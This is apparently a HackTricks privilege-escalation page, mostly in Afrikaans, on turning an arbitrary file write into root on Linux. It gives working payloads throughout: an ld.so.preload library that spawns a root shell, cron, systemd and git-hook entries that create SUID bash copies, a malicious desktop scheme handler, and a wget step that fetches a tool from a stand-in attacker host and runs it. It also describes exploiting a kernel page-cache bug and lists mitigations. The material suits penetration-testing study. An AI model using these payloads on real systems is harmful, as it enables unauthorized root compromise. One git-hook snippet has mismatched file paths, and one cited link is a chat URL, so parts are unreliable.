# Arbitrary File Write to Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Hierdie lêer gedra hom soos die **`LD_PRELOAD`** omgewingsveranderlike, maar dit werk ook in **SUID binaries**.\
As jy dit kan skep of wysig, kan jy net 'n **pad na 'n library wat gelaai sal word** met elke uitgevoerde binary byvoeg.

Byvoorbeeld: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) is **scripts** wat op verskeie **events** in 'n git repository **uitgevoer** word, soos wanneer 'n commit geskep word, 'n merge... So as 'n **privileged script or user** hierdie aksies gereeld uitvoer en dit moontlik is om in die `.git`-folder te **skryf**, kan dit gebruik word om **privesc** te doen.

Byvoorbeeld, dit is moontlik om 'n **script** in 'n git repo in **`.git/hooks`** te genereer sodat dit altyd uitgevoer word wanneer 'n nuwe commit geskep word:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

As jy **cron-verwante lêers kan skryf wat root uitvoer**, kan jy gewoonlik code execution kry die volgende keer wat die job loop. Interessante teikens sluit in:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Root se eie crontab in `/var/spool/cron/` of `/var/spool/cron/crontabs/`
- `systemd` timers en die services wat hulle trigger

Quick checks:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Tipiese misbruikpaaie:

- **Voeg 'n nuwe root cron job by** na `/etc/crontab` of 'n lêer in `/etc/cron.d/`
- **Vervang 'n script** wat reeds deur `run-parts` uitgevoer word
- **Plaas 'n backdoor in 'n bestaande timer target** deur die script of binary wat dit begin te wysig

Minimale cron payload voorbeeld:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
As jy net binne ’n cron-gids kan skryf wat deur `run-parts` gebruik word, plaas eerder ’n uitvoerbare lêer daar:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notas:

- `run-parts` ignoreer gewoonlik lêername wat punte bevat, so verkies name soos `backup` eerder as `backup.sh`.
- Sommige distros gebruik `anacron` of `systemd` timers in plaas van klassieke cron, maar die misbruik-idee is dieselfde: **wysig wat root later sal uitvoer**.

### Service & Socket files

As jy **`systemd`** unit files of lêers waarna hulle verwys kan skryf, kan jy moontlik code execution as root kry deur die unit te herlaai en te herbegin, of deur te wag vir die service/socket activation path om te trigger.

Interessante targets sluit in:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides in `/etc/systemd/system/<unit>.d/*.conf`
- Service scripts/binaries waarna verwys word deur `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Writable `EnvironmentFile=` paths wat deur 'n root service gelaai word

Quick checks:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Algemene misbruikpaaie:

- **Oorskryf `ExecStart=`** in ’n root-besitte service unit wat jy kan wysig
- **Voeg ’n drop-in override by** met ’n kwaadwillige `ExecStart=` en verwyder eers die ou een
- **Backdoor die script/binary** wat reeds deur die unit verwys word
- **Hijack ’n socket-activated service** deur die ooreenstemmende `.service`-lêer te wysig wat begin wanneer die socket ’n connection ontvang

Voorbeeld van ’n kwaadwillige override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Tipiese aktiveringsvloei:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
As jy nie self dienste kan herbegin nie maar wel ’n socket-geaktiveerde unit kan wysig, hoef jy dalk net te **wag vir ’n kliëntverbinding** om uitvoering van die backdoored diens as root te trigger.

### Oorskryf ’n beperkende `php.ini` wat deur ’n bevoorregte PHP sandbox gebruik word

Sommige custom daemons valideer user-supplied PHP deur `php` met ’n **restricted `php.ini`** te laat loop (byvoorbeeld, `disable_functions=exec,system,...`). As die sandboxed code steeds **enige write primitive** het (soos `file_put_contents`) en jy kan die **presiese `php.ini` path** bereik wat deur die daemon gebruik word, kan jy daardie config **oorskryf** om restrictions op te hef en dan ’n tweede payload submit wat met elevated privileges loop.

Tipiese flow:

1. Eerste payload oorskryf die sandbox config.
2. Tweede payload execute code nou dat dangerous functions weer enabled is.

Minimal example (replace the path used by the daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
As die daemon as root loop (of met root-eienaarskap-paaie valideer), gee die tweede uitvoering ’n root-konteks. Dit is in wese **privilege escalation via config overwrite** wanneer die sandboxed runtime steeds lêers kan skryf.

### binfmt_misc

Die lêer wat in `/proc/sys/fs/binfmt_misc` geleë is, dui aan watter binary watter tipe lêers moet execute. TODO: check the requirements to abuse this to execute a rev shell when a common file type is open.

### Overwrite schema handlers (like http: or https:)

’n Aanvaller met skryftoestemmings tot ’n slagoffer se configuration directories kan maklik files vervang of skep wat system behavior verander, wat in unintended code execution lei. Deur die `$HOME/.config/mimeapps.list`-lêer te modify om HTTP en HTTPS URL handlers na ’n malicious file te wys (bv. deur `x-scheme-handler/http=evil.desktop` te stel), verseker die aanvaller dat **clicking any http or https link code trigger wat in daardie `evil.desktop`-lêer gespesifiseer is**. Byvoorbeeld, nadat die volgende malicious code in `evil.desktop` in `$HOME/.local/share/applications` geplaas is, run enige external URL click die embedded command:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Vir meer inligting kyk [**hierdie pos**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) waar dit gebruik is om 'n regte kwesbaarheid uit te buit.

### Root executing user-writable scripts/binaries

As 'n bevoorregte workflow iets soos `/bin/sh /home/username/.../script` laat loop (of enige binary binne 'n gids wat deur 'n onvoorregte gebruiker besit word), kan jy dit kaap:

- **Detect the execution:** monitor prosesse met [pspy](https://github.com/DominicBreuker/pspy) om root te vang wat gebruiker-beheerde paths aanroep:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Bevestig skryfbaarheid:** maak seker beide die teikenlêer en sy gids word deur jou gebruiker besit/is skryfbaar.
- **Kaping van die teiken:** rugsteun die oorspronklike binêre/script en plaas 'n payload wat 'n SUID shell skep (of enige ander root-aksie), en herstel dan toestemmings:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Trigger the privileged action** (e.g., pressing a UI button that spawns the helper). When root re-executes the hijacked path, gryp die verhoogde shell met `./rootshell -p`.

### Page-cache-only file modification of privileged binaries

Sommige kernel-bugs verander nie die lêer **op skyf** nie. In plaas daarvan laat hulle jou net die **page cache copy** van ’n leesbare lêer verander. As jy ’n **setuid** of andersins **root-executed** binary kan teiken, kan die volgende uitvoering attacker-controlled bytes uit memory laat loop en privileges verhoog selfs al is die lêerhash op skyf onveranderd.

Dit is nuttig om hieroor te dink as ’n **runtime-only file write primitive**:

- **Disk stays clean**: die inode en on-disk bytes verander nie
- **Memory is dirty**: processes wat die cached page lees/uitvoer, kry die attacker-gewysigde content
- **Effect is temporary**: die verandering verdwyn ná reboot of cache eviction

Hierdie primitive sit tussen klassieke **arbitrary file write** en ouer **page-cache abuse** bugs soos Dirty COW / Dirty Pipe:

- Dirty COW het op ’n race gesteun
- Dirty Pipe het write-position beperkings gehad
- ’n page-cache-only primitive kan meer betroubaar wees as die vulnerable path direkte writes in cached file-backed pages gee

#### Generic privesc flow

1. Kry ’n kernel primitive wat in **file-backed page cache pages** kan skryf
2. Gebruik dit teen ’n **readable privileged binary** of ’n ander root-executed file
3. Trigger execution **before** die page uit die cache verwyder word
4. Kry code execution as root terwyl die on-disk file nog onveranderd lyk

Tipiese hoëwaarde-teikens:

- **setuid-root** binaries
- Helpers wat deur **root services** gelanseer word
- Binaries wat algemeen uit **containers sharing the host kernel/page cache** uitgevoer word

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) is ’n goeie voorbeeld van hierdie klas. Die vulnerable path was in die Linux crypto userspace API (`AF_ALG` / `algif_aead`):

- `splice()` kan verwysings na page-cache pages van ’n leesbare file na die crypto TX scatterlist skuif
- die in-place `algif_aead` decrypt path het source en destination buffers hergebruik
- `authencesn` het toe in die destination tag region geskryf
- wanneer daardie region nog na gespliced file-backed pages verwys het, het die write in die **page cache of the target file** geland

So die interessante technique is nie die CVE self nie, maar die pattern:

- **feed file-backed cache pages into a kernel subsystem**
- laat die subsystem hulle as writable output **treat**
- trigger ’n klein, beheerde overwrite in memory

Die public PoC het herhaalde **4-byte writes** gebruik om `/usr/bin/su` in memory te patch en dit dan uitgevoer.

#### Exposure and hunting

As jy hierdie klas bug vermoed, vertrou nie net op disk integrity checks nie. Verifieer ook:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` kan as 'n module gelaai/afgelaai word
- `CONFIG_CRYPTO_USER_API_AEAD=y`: die koppelvlak is in die kernel ingebou
- setuid binaries is goeie teikens omdat 'n page-cache-only patch genoeg kan wees om 'n local foothold na root te verander

#### Aanvalsoppervlak-vermindering vir die `algif_aead`-pad

As die kwesbare koppelvlak deur 'n laaibare module verskaf word:
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
As dit in die kernel saamgestel is, het sommige disclosures berig dat die init-pad geblokkeer word met:
```bash
initcall_blacklist=algif_aead_init
```
Hierdie soort mitigering is ook die moeite werd om te onthou vir ander kernel LPEs: as exploitation afhang van ’n spesifieke opsionele interface, kan die deaktivering of blacklisting van daardie interface die exploit path breek selfs voordat ’n volledige kernel-opgradering beskikbaar is.

## References

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [Openwall oss-security disclosure for CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [Linux stable fix: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [Copy Fail advisory](https://copy.fail/)
- [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)

{{#include ../../banners/hacktricks-training.md}}
